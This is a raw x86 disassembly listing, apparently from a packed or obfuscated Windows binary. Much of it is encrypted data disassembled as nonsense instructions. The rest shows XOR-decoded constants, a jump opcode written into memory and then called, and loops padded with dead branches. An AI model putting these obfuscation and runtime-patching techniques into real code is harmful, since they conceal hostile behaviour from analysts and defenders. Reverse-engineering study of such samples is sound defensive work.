  40993f:	mov    edx,0x6e067f1e
  409944:	popw   ds
  409946:	inc    ecx
  409947:	fild   QWORD PTR [ebp-0x64]
  40994a:	jl     0x409944
  40994c:	push   eax
  40994d:	sub    bh,BYTE PTR [ecx]
  40994f:	sub    BYTE PTR [esi-0x21],dl
  409952:	dec    edx
  409953:	inc    eax
  409954:	clc    
  409955:	jbe    0x18873ba0
  40995b:	mov    ebp,0x47aef3c7
  409960:	adc    al,0x84
  409963:	push   esp
  409964:	enter  0x9b67,0x7e
  409968:	leave  
  409969:	leave  
  40996a:	dec    ecx
  40996b:	cdq    
  40996c:	aam    0xed
  40996e:	mov    al,ds:0x26d07fa4
  409973:	or     eax,0x9f9f0396
  409978:	fstp   DWORD PTR [ebx+0x12]
  40997b:	scas   al,BYTE PTR es:[edi]
  40997c:	add    dl,ch
  40997e:	aas    
  40997f:	neg    BYTE PTR [edx+ebp*1+0x48]
  409983:	outs   dx,BYTE PTR ds:[esi]
  409984:	jne    0x409993
  409986:	cmc    
  409987:	pop    eax
  409988:	(bad)
  40998c:	mov    al,ds:0xb13ed83e
  409991:	mov    ecx,0x21ca5a8a
  409996:	xor    ebp,ebp
  409998:	ds dec edi
  40999a:	cmp    BYTE PTR [edx-0x442989f0],0x3a
  4099a1:	aam    0xe2
  4099a3:	jo     0x40999f
  4099a5:	jp     0x40998e
  4099a7:	int3   
  4099a8:	stos   DWORD PTR es:[edi],eax
  4099a9:	pop    ss
  4099aa:	call   0xe76e:0x191bf74c
  4099b1:	jo     0x409a2a
  4099b3:	adc    BYTE PTR [edx],cl
  4099b5:	xchg   BYTE PTR [esp+ecx*2],al
  4099b8:	ror    BYTE PTR [ebx-0x4d1bda3d],0xbd
  4099bf:	push   edx
  4099c0:	push   ds
  4099c1:	aad    0xaf
  4099c3:	mov    ds:0xd11594e7,eax
  4099c8:	push   edi
  4099c9:	nop
  4099ca:	das    
  4099cb:	mov    ah,BYTE PTR [eax+0x225edd3b]
  4099d1:	jecxz  0x4099a6
  4099d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d4:	push   esp
  4099d5:	(bad)  
  4099d7:	push   es
  4099d8:	xor    eax,0x43c04ca9
  4099dd:	adc    edi,DWORD PTR [edi-0x5b]
  4099e0:	loopne 0x4099bd
  4099e2:	sub    BYTE PTR [esp+esi*8-0x797ffcb9],dh
  4099e9:	jno    0x409a12
  4099eb:	cmc    
  4099ec:	push   cs
  4099ed:	(bad)  
  4099ee:	test   BYTE PTR [edi+edx*1],bl
  4099f1:	loop   0x409989
  4099f3:	test   BYTE PTR es:[ebp+eax*1+0x286e33e0],cl
  4099fb:	loope  0x40998a
  4099fd:	sbb    eax,0xec1924f7
  409a02:	test   esi,eax
  409a04:	int    0x28
  409a06:	and    dl,BYTE PTR [esi+0x2d7303fa]
  409a0c:	mov    dl,0xde
  409a0e:	loope  0x4099da
  409a10:	push   ebp
  409a11:	cmp    ecx,ebp
  409a13:	stos   BYTE PTR es:[edi],al
  409a14:	adc    eax,0x18eb86ee
  409a19:	cmp    ebp,ebx
  409a1b:	nop
  409a1c:	cdq    
  409a1d:	lds    ebp,FWORD PTR [edi+0x561943ed]
  409a23:	xor    DWORD PTR [ecx+0x4f37fbe3],0x42
  409a2a:	pop    ecx
  409a2b:	pop    esi
  409a2c:	xlat   BYTE PTR ds:[ebx]
  409a2d:	out    dx,eax
  409a2e:	out    dx,al
  409a2f:	inc    ebx
  409a30:	cdq    
  409a31:	mov    dh,0x30
  409a33:	cmp    DWORD PTR [ecx-0x6b4a9d94],edi
  409a39:	add    al,0x7e
  409a3b:	stos   BYTE PTR es:[edi],al
  409a3c:	dec    esp
  409a3d:	pop    ebx
  409a3e:	pop    ebx
  409a3f:	cmp    al,0xad
  409a41:	jmp    0x9fc799cd
  409a46:	xor    BYTE PTR [edi-0x11dd4926],dh
  409a4c:	call   0x48536363
  409a51:	dec    eax
  409a52:	inc    ebx
  409a53:	xor    eax,0xe770f3b0
  409a58:	mov    ebp,ds
  409a5a:	mov    eax,0x453026f6
  409a5f:	pop    ecx
  409a60:	ins    DWORD PTR es:[edi],dx
  409a61:	out    0x55,al
  409a63:	(bad)  
  409a66:	pop    ebp
  409a67:	jl     0x409a3d
  409a69:	les    edx,FWORD PTR [edx+0x7b88d9c6]
  409a6f:	iret   
  409a70:	sub    ah,bl
  409a72:	jmp    eax
  409a74:	inc    ebp
  409a75:	dec    edi
  409a76:	adc    eax,0xf2a2aa76
  409a7b:	ins    BYTE PTR es:[edi],dx
  409a7c:	int3   
  409a7d:	ins    DWORD PTR es:[edi],dx
  409a7e:	jb     0x409aaf
  409a80:	daa    
  409a81:	add    dh,BYTE PTR [edx-0x27097d50]
  409a87:	or     ebp,esp
  409a89:	mov    ebp,0xe5e4c17d
  409a8e:	test   BYTE PTR [ebx-0x3335824a],0xa7
  409a95:	mov    eax,0x1f5927ba
  409a9a:	pushf  
  409a9b:	push   edx
  409a9c:	mov    ds:0x29593839,eax
  409aa1:	jmp    0xc2d5:0x85f7bf02
  409aa8:	outs   dx,DWORD PTR ds:[esi]
  409aa9:	or     eax,0xc75f956e
  409aae:	jno    0x409ab1
  409ab0:	jo     0x409ad2
  409ab2:	shl    DWORD PTR [ebp+esi*1+0x23],cl
  409ab6:	or     eax,0x72f1278a
  409abb:	call   0x4605:0x9d7905bd
  409ac2:	push   es
  409ac3:	xchg   BYTE PTR fs:[ecx-0x7b],bl
  409ac7:	sbb    ecx,DWORD PTR [ebx]
  409ac9:	pushf  
  409aca:	or     DWORD PTR [edi+0x44],esp
  409acd:	arpl   WORD PTR [eax-0x3f],di
  409ad0:	mov    dh,BYTE PTR [ebp+0x42]
  409ad3:	and    ebp,DWORD PTR [eax-0x2d]
  409ad6:	pop    esi
  409ad7:	sbb    BYTE PTR [esi-0x233706ad],dh
  409add:	xchg   edx,eax
  409ade:	jmp    0x409af8
  409ae0:	mov    ah,0x70
  409ae2:	bound  edx,QWORD PTR [ecx-0x7823c47f]
  409ae8:	stc    
  409ae9:	sub    al,0xc8
  409aeb:	xor    al,0xb3
  409aed:	push   0xffffffa4
  409aef:	pop    ebp
  409af0:	ja     0x409aa2
  409af2:	pushf  
  409af3:	mov    ecx,0xcc126634
  409af8:	and    al,0xc4
  409afa:	push   cs
  409afb:	cmp    ebx,DWORD PTR [eax+0x7d]
  409afe:	std    
  409aff:	clc    
  409b00:	pushf  
  409b01:	bswap  ebp
  409b03:	add    eax,0x41d53467
  409b08:	pop    ebx
  409b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0a:	retf   0x3c53
  409b0d:	push   es
  409b0e:	push   0x47
  409b10:	jecxz  0x409ae7
  409b12:	mov    eax,ds:0xf88ffaa4
  409b17:	ds cmc 
  409b19:	xchg   ebp,eax
  409b1a:	add    al,0x90
  409b1c:	pop    es
  409b1d:	mov    bl,BYTE PTR [ecx]
  409b1f:	cdq    
  409b20:	mov    bh,0x56
  409b22:	xor    eax,DWORD PTR [eax]
  409b24:	mov    esp,0x7f0f18c0
  409b29:	add    DWORD PTR [edx-0x2dbdaa37],ecx
  409b2f:	jns    0x409baf
  409b31:	jno    0x409b22
  409b33:	inc    ebp
  409b34:	cs cmp eax,0xe775a635
  409b3a:	push   esi
  409b3b:	and    al,0xb
  409b3d:	mov    eax,ds:0xc815f3cc
  409b42:	dec    ecx
  409b43:	shl    bh,0xee
  409b46:	jl     0x409b59
  409b48:	sbb    eax,0xdc6a1b9a
  409b4d:	sub    eax,0xb8c9ef85
  409b52:	xchg   edi,eax
  409b53:	pop    esi
  409b54:	(bad)  
  409b55:	mov    ds:0xc23effc9,eax
  409b5a:	pop    ecx
  409b5b:	daa    
  409b5c:	sahf   
  409b5d:	ins    DWORD PTR es:[edi],dx
  409b5e:	xchg   DWORD PTR [ebx-0x464ae396],esi
  409b64:	mov    ebx,0xf6ac951f
  409b69:	push   0x7907ff6c
  409b6e:	in     eax,0x96
  409b70:	(bad)  
  409b71:	leave  
  409b72:	add    esi,DWORD PTR [ecx+0x14aac96f]
  409b78:	aas    
  409b79:	add    al,BYTE PTR [edi]
  409b7b:	dec    ecx
  409b7c:	pop    edi
  409b7d:	jo     0x409b47
  409b7f:	or     eax,0x69500afc
  409b84:	push   ebp
  409b85:	mov    BYTE PTR [ecx+ecx*1+0x77],bh
  409b89:	in     eax,dx
  409b8a:	lds    esp,FWORD PTR [edi+0x63]
  409b8d:	inc    esp
  409b8e:	mov    eax,0xbf10196c
  409b93:	jmp    0x3438d4f0
  409b98:	jno    0x409bdc
  409b9a:	cmp    BYTE PTR [ecx-0x49],al
  409b9d:	sub    dl,ch
  409b9f:	sti    
  409ba0:	and    ecx,DWORD PTR [esi-0x65]
  409ba3:	je     0x409b83
  409ba5:	xchg   edi,eax
  409ba6:	xchg   ebx,eax
  409ba7:	lea    ecx,[edx]
  409ba9:	add    esp,DWORD PTR [ebx+ebp*2+0x68277786]
  409bb0:	aas    
  409bb1:	ja     0x409bc9
  409bb3:	and    dh,dh
  409bb5:	popa   
  409bb6:	mov    al,ds:0x27d2e47e
  409bbb:	test   dh,0x65
  409bbe:	in     al,dx
  409bbf:	in     al,0xf5
  409bc1:	(bad)
  409bc5:	pop    ds
  409bc6:	lods   eax,DWORD PTR ds:[esi]
  409bc7:	inc    eax
  409bc8:	push   0x4f
  409bca:	das    
  409bcb:	mov    edi,0x4a890b3e
  409bd0:	sbb    ebx,DWORD PTR [ecx-0x295df158]
  409bd6:	push   eax
  409bd7:	lahf   
  409bd8:	jl     0x409bbe
  409bda:	dec    eax
  409bdb:	data16 mov ch,0x9a
  409bde:	cmp    eax,DWORD PTR [ecx+0x64b36a22]
  409be4:	xor    dl,al
  409be6:	mov    ecx,eax
  409be8:	neg    DWORD PTR [edi+0x80e31c3]
  409bee:	jg     0x409c17
  409bf0:	or     al,0x30
  409bf2:	icebp  
  409bf3:	test   eax,0x710d6fe0
  409bf8:	push   ebp
  409bf9:	pop    ecx
  409bfa:	fimul  DWORD PTR [edi+0x7162aac1]
  409c00:	inc    edi
  409c01:	mov    al,ds:0x27e8619
  409c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c07:	push   esi
  409c08:	(bad)  
  409c09:	rol    BYTE PTR [ecx+0xdb0297b],1
  409c0f:	pop    esi
  409c10:	es xor al,0x1e
  409c13:	dec    ecx
  409c14:	sbb    ecx,DWORD PTR [edi-0x2c87ef82]
  409c1a:	lods   al,BYTE PTR ds:[esi]
  409c1b:	inc    esp
  409c1c:	enter  0x7e50,0xf6
  409c20:	jb     0x409c48
  409c22:	sub    edx,DWORD PTR [edi+0x18]
  409c25:	xchg   edi,eax
  409c26:	aam    0x1f
  409c28:	jl     0x409bf0
  409c2a:	sub    al,0x58
  409c2c:	neg    BYTE PTR [eax-0x533da1a1]
  409c32:	adc    eax,0x91720691
  409c37:	in     eax,dx
  409c38:	dec    ebp
  409c39:	mov    esi,0x1358f771
  409c3e:	pop    ecx
  409c3f:	mov    dh,0x84
  409c41:	jb     0x409bee
  409c43:	xchg   esi,eax
  409c44:	pop    ds
  409c45:	(bad)  
  409c46:	mov    ds:0x6bc101e2,al
  409c4b:	cmp    eax,0xf46d306d
  409c50:	adc    eax,0xd3844113
  409c55:	dec    ebx
  409c56:	pop    es
  409c57:	lods   eax,DWORD PTR ds:[esi]
  409c58:	mov    esp,0x125e66ae
  409c5d:	iret   
  409c5e:	jp     0x409c67
  409c60:	cmp    al,0xd8
  409c62:	adc    al,0xa2
  409c64:	mov    DWORD PTR [esi-0x52],esi
  409c67:	pushf  
  409c68:	int3   
  409c69:	outs   dx,BYTE PTR ds:[esi]
  409c6a:	push   0xffffff96
  409c6c:	mov    eax,ds:0xb8c512ba
  409c71:	lods   eax,DWORD PTR ds:[esi]
  409c72:	out    0x3,al
  409c74:	mov    ebx,0x35fc98ab
  409c79:	sub    al,0x1b
  409c7b:	dec    edi
  409c7c:	jno    0x409cde
  409c7e:	addr16 cld 
  409c80:	and    eax,0xbd1ed585
  409c85:	jl     0x409c09
  409c87:	push   0xffffffa1
  409c89:	cld    
  409c8a:	mov    dl,0xc
  409c8c:	jns    0x409cb9
  409c8e:	mov    esi,DWORD PTR [ebp+0x2e]
  409c91:	(bad)  
  409c92:	popa   
  409c93:	popa   
  409c94:	or     bl,BYTE PTR [edi+0x57]
  409c97:	popf   
  409c98:	ins    DWORD PTR es:[edi],dx
  409c99:	dec    ecx
  409c9a:	cmp    bl,BYTE PTR fs:[ecx+0x465b378f]
  409ca1:	xchg   ebx,eax
  409ca2:	(bad)  
  409ca3:	outs   dx,DWORD PTR fs:[esi]
  409ca5:	popa   
  409ca6:	pop    ebx
  409ca7:	in     eax,dx
  409ca8:	add    DWORD PTR [ecx+0x5a],esp
  409cab:	and    DWORD PTR [eax],0x87e19e4a
  409cb1:	fiadd  DWORD PTR [ecx+0x32f3eeea]
  409cb7:	int3   
  409cb8:	push   esi
  409cb9:	test   BYTE PTR [edi+0x62],dh
  409cbc:	push   ss
  409cbd:	popf   
  409cbe:	xchg   edi,eax
  409cbf:	mov    bh,0x61
  409cc1:	mov    ebx,0x3142e1aa
  409cc6:	dec    esp
  409cc7:	enter  0x7ef8,0xf9
  409ccb:	add    DWORD PTR [eax-0x63],edx
  409cce:	cmp    eax,0x7e65cf32
  409cd3:	xchg   ecx,eax
  409cd4:	in     al,0x3d
  409cd6:	daa    
  409cd7:	in     al,dx
  409cd8:	jne    0x409cce
  409cda:	loope  0x409ce7
  409cdc:	mov    BYTE PTR [esi-0x1b],0xc8
  409ce0:	int    0x98
  409ce2:	jmp    0x211f3458
  409ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ce8:	xor    al,0xe7
  409cea:	fwait
  409ceb:	in     eax,dx
  409cec:	and    cl,ch
  409cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cef:	pop    ds
  409cf0:	retf   
  409cf1:	add    bh,BYTE PTR ds:0xb94870a7
  409cf7:	cmc    
  409cf8:	das    
  409cf9:	into   
  409cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cfb:	aaa    
  409cfc:	inc    edi
  409cfd:	push   ebp
  409cfe:	dec    ecx
  409cff:	aaa    
  409d00:	mov    DWORD PTR [edi-0x72],edx
  409d03:	xchg   ebp,eax
  409d04:	inc    esp
  409d05:	xor    DWORD PTR [ebx],0xffffffe2
  409d08:	pusha  
  409d09:	std    
  409d0a:	pop    eax
  409d0b:	shl    DWORD PTR [edi+edi*4+0x57],1
  409d0f:	adc    eax,0x8fa7e3e2
  409d14:	xor    ah,BYTE PTR ds:0x3159af78
  409d1a:	adc    DWORD PTR [edx],esi
  409d1c:	(bad)  
  409d1d:	push   ebp
  409d1e:	into   
  409d1f:	dec    esp
  409d20:	bound  ebx,QWORD PTR [ecx+0x54acac3c]
  409d26:	mov    ah,0xd4
  409d28:	cmp    DWORD PTR [esi-0x32],eax
  409d2b:	mov    gs,WORD PTR [edi]
  409d2d:	sbb    ebx,ebx
  409d2f:	out    dx,al
  409d30:	push   cs
  409d31:	das    
  409d32:	out    0xeb,eax
  409d34:	xor    BYTE PTR [edi-0xf6e9f83],dh
  409d3a:	(bad)  
  409d3b:	jno    0x409cc8
  409d3d:	and    BYTE PTR gs:[ebp+edx*2+0x43f8e80d],cl
  409d45:	sub    bh,dh
  409d47:	mov    al,ds:0x73ab5ba9
  409d4c:	in     eax,dx
  409d4d:	mov    ?,WORD PTR [esi+0x4d]
  409d50:	cmp    dl,BYTE PTR [ecx+eax*8-0x964a84e]
  409d57:	cmp    BYTE PTR [esi],al
  409d59:	xor    DWORD PTR [esi+0x1bb09f58],0x51
  409d60:	fdivr  QWORD PTR [edi]
  409d62:	fdivr  st,st(5)
  409d64:	cli    
  409d65:	mov    ds:0xe8afbef0,eax
  409d6a:	scas   eax,DWORD PTR es:[edi]
  409d6b:	sub    al,0x5e
  409d6d:	sbb    eax,esi
  409d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d70:	jle    0x409d71
  409d72:	and    eax,0xe7556020
  409d77:	xchg   BYTE PTR [ecx],al
  409d79:	push   ds
  409d7a:	daa    
  409d7b:	xchg   ebp,eax
  409d7c:	out    0xb2,eax
  409d7e:	mov    WORD PTR [eax],ss
  409d80:	push   ds
  409d81:	push   ebx
  409d82:	inc    esi
  409d83:	push   ebp
  409d84:	shl    edx,0x8f
  409d87:	mov    ch,0xae
  409d89:	jae    0x409d1a
  409d8b:	stos   DWORD PTR es:[edi],eax
  409d8c:	js     0x409d87
  409d8e:	mov    BYTE PTR [ecx],bl
  409d90:	and    al,0xe5
  409d92:	jle    0x409dac
  409d94:	push   ecx
  409d95:	int3   
  409d96:	jne    0x409d73
  409d98:	inc    ebp
  409d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d9a:	arpl   WORD PTR [edx+0x383f9f38],si
  409da0:	jbe    0x409e20
  409da2:	lahf   
  409da3:	sub    DWORD PTR [eax],ebp
  409da5:	pop    esi
  409da6:	and    al,0x9e
  409da8:	fld    QWORD PTR [edi-0x4d1e09b9]
  409dae:	xor    eax,0x676b1630
  409db3:	scas   al,BYTE PTR es:[edi]
  409db4:	(bad)  
  409db5:	jg     0x409dc0
  409db7:	jmp    ebp
  409db9:	loopne 0x409d40
  409dbb:	pop    ebx
  409dbc:	mov    edi,DWORD PTR [eax-0x2]
  409dbf:	ins    BYTE PTR es:[di],dx
  409dc1:	push   edx
  409dc2:	pop    ds
  409dc3:	jae    0x409de4
  409dc5:	out    0xa1,al
  409dc7:	pop    ss
  409dc8:	adc    al,0xa2
  409dca:	adc    al,0xcc
  409dcc:	xchg   esp,eax
  409dcd:	jne    0x409d5b
  409dcf:	xchg   DWORD PTR [ebx+0x5a],ebx
  409dd2:	or     al,0x30
  409dd4:	outs   dx,DWORD PTR ds:[esi]
  409dd5:	rdmsr  
  409dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd8:	lods   al,BYTE PTR ds:[esi]
  409dd9:	push   ebx
  409dda:	xor    bl,BYTE PTR [ebp+0xa]
  409ddd:	loopne 0x409d62
  409ddf:	sub    eax,0xea35c457
  409de4:	mov    dh,0xf5
  409de6:	xor    BYTE PTR [edx],ah
  409de8:	ss ins DWORD PTR es:[edi],dx
  409dea:	adc    BYTE PTR [edx+0x6b],cl
  409ded:	pop    ss
  409dee:	fdivr  DWORD PTR [ecx]
  409df0:	sub    eax,ecx
  409df2:	mov    DWORD PTR [ebp-0x4],eax
  409df5:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  409dfc:	mov    eax,DWORD PTR [ebp-0xc]
  409dff:	xor    eax,esi
  409e01:	add    eax,edi
  409e03:	push   eax
  409e04:	mov    eax,DWORD PTR [ebp-0x10]
  409e07:	xor    eax,esi
  409e09:	add    eax,edi
  409e0b:	push   eax
  409e0c:	mov    eax,DWORD PTR [ebp-0x4]
  409e0f:	xor    eax,esi
  409e11:	add    eax,edi
  409e13:	push   eax
  409e14:	lea    eax,[ebp-0x7c]
  409e17:	push   eax
  409e18:	push   DWORD PTR [ebp-0x2c]
  409e1b:	push   DWORD PTR [ebp-0x28]
  409e1e:	call   0x40c8dd
  409e23:	test   eax,eax
  409e25:	je     0x409e53
  409e2b:	lea    eax,[ebp-0x7c]
  409e2e:	push   eax
  409e2f:	mov    eax,DWORD PTR [ebp-0x28]
  409e32:	xor    eax,esi
  409e34:	add    eax,edi
  409e36:	push   eax
  409e37:	mov    eax,DWORD PTR [ebp-0x24]
  409e3a:	add    eax,0xaa
  409e3f:	push   eax
  409e40:	mov    eax,DWORD PTR [ebp-0x24]
  409e43:	mov    eax,DWORD PTR [eax+0x198]
  409e49:	push   DWORD PTR [eax]
  409e4b:	call   0x402992
  409e50:	mov    DWORD PTR [ebp-0x14],eax
  409e53:	lea    eax,[ebp+0x4]
  409e56:	mov    DWORD PTR [ebp-0x30],eax
  409e59:	mov    eax,DWORD PTR [ebp-0x14]
  409e5c:	test   eax,eax
  409e5e:	je     0x409ec6
  409e64:	lea    eax,[ebp-0x8]
  409e67:	mov    DWORD PTR [ebp-0x38],eax
  409e6a:	mov    eax,DWORD PTR [ebp-0x34]
  409e6d:	mov    DWORD PTR [ebp-0x8],eax
  409e70:	mov    eax,DWORD PTR [ebp-0x8]
  409e73:	mov    ecx,DWORD PTR [ebp-0x14]
  409e76:	sub    eax,ecx
  409e78:	mov    DWORD PTR [ebp-0x8],eax
  409e7b:	mov    ecx,DWORD PTR [ebp-0x4]
  409e7e:	xor    ecx,esi
  409e80:	mov    eax,0xffcd8d20
  409e85:	sub    eax,ecx
  409e87:	add    DWORD PTR [ebp-0x8],eax
  409e8a:	mov    eax,DWORD PTR [ebp-0x8]
  409e8d:	mov    ecx,DWORD PTR [ebp-0x14]
  409e90:	mov    DWORD PTR [ecx+0x1],eax
  409e93:	mov    eax,DWORD PTR [ebp-0x14]
  409e96:	push   DWORD PTR [ebp-0x24]
  409e99:	mov    BYTE PTR [eax],0xe9
  409e9c:	mov    eax,ds:0x42e18f
  409ea1:	push   DWORD PTR [eax]
  409ea3:	push   DWORD PTR ds:0x42e3eb
  409ea9:	push   DWORD PTR ds:0x42e197
  409eaf:	push   DWORD PTR ds:0x42e3cb
  409eb5:	push   DWORD PTR ds:0x42e6f3
  409ebb:	push   DWORD PTR [ebp-0x28]
  409ebe:	push   DWORD PTR [ebp-0x2c]
  409ec1:	mov    eax,DWORD PTR [ebp-0x14]
  409ec4:	call   eax
  409ec6:	mov    eax,DWORD PTR [ebp-0x30]
  409ec9:	mov    ecx,DWORD PTR ds:0x42e38f
  409ecf:	add    DWORD PTR [eax],ecx
  409ed1:	pop    edi
  409ed2:	pop    esi
  409ed3:	leave  
  409ed4:	ret    
  409ed5:	push   ebp
  409ed6:	mov    ebp,esp
  409ed8:	sub    esp,0x18
  409edb:	add    edx,DWORD PTR ds:0x42c004
  409ee1:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  409ee8:	xor    DWORD PTR ds:0x42d018,0x529f
  409ef2:	lea    eax,[ebp+0x14]
  409ef5:	sbb    ecx,edx
  409ef7:	mov    DWORD PTR [ebp-0x4],eax
  409efa:	add    DWORD PTR ds:0x429010,edx
  409f00:	push   esi
  409f01:	mov    DWORD PTR ds:0x429000,0x1b
  409f0b:	cmp    DWORD PTR ds:0x429000,0x0
  409f12:	je     0x409f77
  409f18:	cmp    DWORD PTR ds:0x429000,0xb
  409f1f:	jne    0x409f38
  409f25:	push   DWORD PTR [ebp-0x28]
  409f28:	push   0x0
  409f2a:	push   0x42d010
  409f2f:	push   DWORD PTR [ebp-0x1c]
  409f32:	call   DWORD PTR ds:0x42e9af
  409f38:	cmp    DWORD PTR ds:0x429000,0xc
  409f3f:	jne    0x409f54
  409f45:	xor    esi,esi
  409f47:	or     esi,DWORD PTR ds:0x429000
  409f4d:	dec    esi
  409f4e:	mov    DWORD PTR ds:0x429000,esi
  409f54:	mov    esi,DWORD PTR ds:0x429000
  409f5a:	dec    esi
  409f5b:	mov    DWORD PTR ds:0x429000,esi
  409f61:	jmp    0x409f0b
  409f66:	mov    ecx,DWORD PTR ds:0x41ac60
  409f6c:	mov    edx,DWORD PTR ds:0x41ac64
  409f72:	sub    ecx,edx
  409f74:	xor    ecx,DWORD PTR [ecx+edx*1]
  409f77:	mov    esi,0xf89c85b9
  409f7c:	xor    DWORD PTR ds:0x429028,edx
  409f82:	mov    DWORD PTR [ebp-0xc],esi
  409f85:	sub    DWORD PTR ds:0x42a014,edi
  409f8b:	lea    eax,[ebp-0xc]
  409f8e:	movzx  edx,BYTE PTR ds:0x42c014
  409f95:	adc    edx,DWORD PTR ds:0x42a004
  409f9b:	mov    DWORD PTR ds:0x42c014,edx
  409fa1:	mov    DWORD PTR [ebp-0x14],eax
  409fa4:	or     DWORD PTR ds:0x42d010,0xdad
  409fae:	mov    eax,DWORD PTR [ebp-0xc]
  409fb1:	and    DWORD PTR ds:0x429008,0x0
  409fbb:	jmp    0x409fcd
  409fc0:	mov    ecx,DWORD PTR ds:0x429008
  409fc6:	inc    ecx
  409fc7:	mov    DWORD PTR ds:0x429008,ecx
  409fcd:	cmp    DWORD PTR ds:0x429008,0x15
  409fd4:	jae    0x40a012
  409fda:	cmp    DWORD PTR ds:0x429008,0x9
  409fe1:	jne    0x409fed
  409fe7:	call   DWORD PTR ds:0x42e9b3
  409fed:	cmp    DWORD PTR ds:0x429008,0x8
  409ff4:	jne    0x40a007
  409ffa:	mov    ecx,DWORD PTR ds:0x429008
  40a000:	inc    ecx
  40a001:	mov    DWORD PTR ds:0x429008,ecx
  40a007:	jmp    0x409fc0
  40a00c:	sub    DWORD PTR ds:0x42901c,edx
  40a012:	mov    edx,DWORD PTR [ebp-0x14]
  40a015:	and    DWORD PTR ds:0x42b010,0x0
  40a01f:	jmp    0x40a031
  40a024:	mov    ecx,DWORD PTR ds:0x42b010
  40a02a:	inc    ecx
  40a02b:	mov    DWORD PTR ds:0x42b010,ecx
  40a031:	cmp    DWORD PTR ds:0x42b010,0x17
  40a038:	jae    0x40a06e
  40a03e:	cmp    DWORD PTR ds:0x42b010,0x19
  40a045:	jne    0x40a069
  40a04b:	push   DWORD PTR [ebp-0x10]
  40a04e:	push   0x429008
  40a053:	push   0x87b9
  40a058:	push   DWORD PTR [ebp-0x1c]
  40a05b:	push   DWORD PTR [ebp-0x24]
  40a05e:	push   0x8ec6
  40a063:	call   DWORD PTR ds:0x42e9b7
  40a069:	jmp    0x40a024
  40a06e:	mov    ecx,0x7510899
  40a073:	xor    eax,ecx
  40a075:	add    eax,0x3272e0
  40a07a:	mov    DWORD PTR [edx],eax
  40a07c:	mov    eax,ds:0x42e18b
  40a081:	add    DWORD PTR ds:0x429020,ebx
  40a087:	mov    edx,DWORD PTR [ebp-0x4]
  40a08a:	mov    eax,DWORD PTR [eax]
  40a08c:	add    DWORD PTR ds:0x42d010,0x42b008
  40a096:	add    eax,DWORD PTR [edx]
  40a098:	sbb    edx,DWORD PTR ds:0x42c00c
  40a09e:	push   edi
  40a09f:	mov    DWORD PTR [ebp-0x8],eax
  40a0a2:	and    DWORD PTR ds:0x42c014,0x0
  40a0ac:	jmp    0x40a0bf
  40a0b1:	xor    eax,eax
  40a0b3:	add    eax,DWORD PTR ds:0x42c014
  40a0b9:	inc    eax
  40a0ba:	mov    ds:0x42c014,eax
  40a0bf:	cmp    DWORD PTR ds:0x42c014,0x1d
  40a0c6:	jae    0x40a159
  40a0cc:	cmp    DWORD PTR ds:0x42c014,0x8
  40a0d3:	jne    0x40a0df
  40a0d9:	call   DWORD PTR ds:0x42e9bb
  40a0df:	cmp    DWORD PTR ds:0x42c014,0x7
  40a0e6:	jne    0x40a0fa
  40a0ec:	xor    eax,eax
  40a0ee:	xor    eax,DWORD PTR ds:0x42c014
  40a0f4:	inc    eax
  40a0f5:	mov    ds:0x42c014,eax
  40a0fa:	jmp    0x40a0b1
  40a0ff:	and    DWORD PTR ds:0x42d004,0x0
  40a109:	jmp    0x40a11c
  40a10e:	xor    eax,eax
  40a110:	or     eax,DWORD PTR ds:0x42d004
  40a116:	inc    eax
  40a117:	mov    ds:0x42d004,eax
  40a11c:	cmp    DWORD PTR ds:0x42d004,0x1c
  40a123:	jae    0x40a159
  40a129:	cmp    DWORD PTR ds:0x42d004,0x2b
  40a130:	jne    0x40a147
  40a136:	push   DWORD PTR [ebp-0x20]
  40a139:	push   0x429018
  40a13e:	push   DWORD PTR [ebp-0x1c]
  40a141:	call   DWORD PTR ds:0x42e9bf
  40a147:	jmp    0x40a10e
  40a14c:	movzx  edi,BYTE PTR ds:0x42c014
  40a153:	sbb    DWORD PTR ds:0x42a004,edi
  40a159:	mov    edi,DWORD PTR [ebp+0x8]
  40a15c:	adc    edx,edx
  40a15e:	mov    eax,ds:0x42e313
  40a163:	mov    eax,DWORD PTR [eax+0x198]
  40a169:	xor    edi,ecx
  40a16b:	mov    DWORD PTR ds:0x42a008,0x1f
  40a175:	cmp    DWORD PTR ds:0x42a008,0x0
  40a17c:	je     0x40a1b8
  40a182:	cmp    DWORD PTR ds:0x42a008,0x2d
  40a189:	jne    0x40a1a4
  40a18f:	push   0x42e000
  40a194:	push   0x42e139
  40a199:	push   0x400000
  40a19e:	call   DWORD PTR ds:0x42e9c7
  40a1a4:	xor    edx,edx
  40a1a6:	add    edx,DWORD PTR ds:0x42a008
  40a1ac:	dec    edx
  40a1ad:	mov    DWORD PTR ds:0x42a008,edx
  40a1b3:	jmp    0x40a175
  40a1b8:	mov    edx,0x3272e0
  40a1bd:	xor    DWORD PTR ds:0x429010,0x6770
  40a1c7:	add    edi,edx
  40a1c9:	cmp    DWORD PTR [eax],edi
  40a1cb:	mov    DWORD PTR ds:0x42900c,0x1dd7
  40a1d5:	je     0x40a1f6
  40a1db:	mov    DWORD PTR ds:0x429014,0x4354
  40a1e5:	mov    eax,DWORD PTR [eax]
  40a1e7:	mov    DWORD PTR ds:0x42900c,0x7b1e
  40a1f1:	jmp    0x40c789
  40a1f6:	mov    eax,ds:0x42a008
  40a1fb:	mov    eax,DWORD PTR [ebp+0x18]
  40a1fe:	cmp    eax,esi
  40a200:	jne    0x40a224
  40a206:	mov    DWORD PTR ds:0x429010,0x2813
  40a210:	push   0xf89c85b8
  40a215:	mov    DWORD PTR ds:0x429020,0x131a
  40a21f:	jmp    0x40c778
  40a224:	mov    esi,0x74b
  40a229:	mov    esi,DWORD PTR [ebp+0x18]
  40a22c:	mov    eax,0xf89c85bb
  40a231:	cmp    esi,eax
  40a233:	mov    DWORD PTR ds:0x42c010,0x1f83
  40a23d:	jne    0x40c768
  40a243:	add    esi,eax
